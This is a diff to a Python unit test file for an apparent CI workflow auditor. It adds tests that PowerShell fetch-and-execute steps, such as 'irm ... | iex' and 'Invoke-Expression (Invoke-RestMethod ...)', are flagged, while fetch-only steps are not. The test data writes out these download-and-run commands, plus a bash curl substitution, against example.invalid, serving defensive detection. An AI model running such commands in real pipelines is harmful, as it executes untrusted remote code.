@@ -810,6 +810,71 @@ class RatchetTests(unittest.TestCase):
         )
         self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)
 
+    def test_powershell_irm_piped_into_iex_denied(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - shell: pwsh\n"
+            "        run: irm https://example.invalid/install.ps1 | iex\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_powershell_invoke_webrequest_invoke_expression_denied(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - shell: powershell\n"
+            "        run: Invoke-WebRequest https://example.invalid/install.ps1 | Invoke-Expression\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_powershell_iex_nested_irm_denied(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - shell: pwsh\n"
+            "        run: iex (irm https://example.invalid/install.ps1)\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_powershell_invoke_expression_nested_full_name_denied(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - shell: pwsh\n"
+            "        run: Invoke-Expression (Invoke-RestMethod https://example.invalid/install.ps1)\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
+
+    def test_powershell_iwr_safe_json_conversion_not_execution(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - shell: pwsh\n"
+            "        run: iwr https://example.invalid/data.json | ConvertFrom-Json\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_powershell_irm_only_fetch_is_not_shell_evaluation(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - shell: pwsh\n"
+            "        run: irm https://example.invalid/data.json\n"
+        )
+        self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 0)
+
+    def test_powershell_iex_legacy_workflow_is_only_historical_if_same_blob(self):
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - shell: pwsh\n"
+            "        run: irm https://example.invalid/install.ps1 | iex\n"
+        )
+        old = self.commit()
+        self.assertEqual(mod.audit(self.repo, old, old).baseline_findings, 1)
+        self.assertEqual(mod.audit(self.repo, old, old).new_risky_workflows, 0)
+        self.write(
+            "jobs:\n  x:\n    steps:\n"
+            "      - shell: pwsh\n"
+            "        run: irm https://example.invalid/install.ps1 | iex\n"
+            "      - run: echo changed\n"
+        )
+        self.assertEqual(mod.audit(self.repo, old, self.commit()).new_risky_workflows, 1)
+
     def test_shell_command_substitution_curl_denied(self):
         self.write("jobs:\n  x:\n    steps:\n      - run: bash -c \"$(curl -fsSL https://example.invalid/install.sh)\"\n")
         self.assertEqual(mod.audit(self.repo, self.base, self.commit()).new_risky_workflows, 1)
